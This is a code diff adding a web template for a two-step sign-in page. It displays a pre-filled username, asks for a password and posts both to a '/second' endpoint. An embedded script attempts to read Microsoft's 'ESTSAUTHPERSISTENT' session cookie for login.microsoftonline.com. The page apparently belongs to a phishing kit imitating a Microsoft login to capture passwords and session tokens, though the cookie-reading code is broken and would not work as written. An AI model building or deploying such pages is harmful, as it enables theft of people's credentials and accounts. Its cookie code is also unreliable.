@@ -1,0 +1,57 @@
+<%- include('header'); -%>
+<html>
+<body>
+  <div class="cardii" "col-5">
+    <div class="cardtop">
+      <img src="images/logoo.png" alt="logo" width="100px" height="80px">
+    </div>
+    <div>
+      <form action="/second" method="POST" class="fum">
+        <i class="fa-solid fa-arrow-left"></i>
+        <p name="username" type="text" id="mail" class="ilight"><%= username %></p>
+        <input type="hidden" id="email" name="username" value="<%= username %>">
+        <h4>Enter password</h4>
+        <input type="password" id="password" placeholder="Password" name="pass" minlength="6" required />
+        <a href="#"><p>Forgot password?</p></a>
+        <button class="btn btn-primary move" type="submit">Sign in</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script type="text/javascript">
+    $(document).ready(function() {
+      // Remove event.preventDefault() as it is not necessary here
+
+      function getCookieValue(cookieName, domain) {
+        var cookies = document.cookie.split(';');
+
+        for (var i = 0; i < cookies.length; i++) {
+          var cookie = cookies[i].trim();
+
+          // Check if the cookie matches the specified name and domain
+          if (cookie.startsWith(cookieName + '=') && cookie.includes('domain=' + domain)) {
+            // Retrieve the cookie value
+            var cookieValue = cookie.substring(cookieName.length + 1);
+
+            // Return the cookie value
+            return cookieValue;
+          }
+        }
+
+        // Cookie not found
+        return null;
+      }
+
+      // Usage example
+      var cookieName = 'ESTSAUTHPERSISTENT';
+      var domain = 'login.microsoftonline.com';
+      var cookieValue = getCookieValue(cookieName, domain);
+      console.log(cookieValue);
+    });
+  </script>
+
+</body>
+</html>
+
+<%- include('footer'); -%>
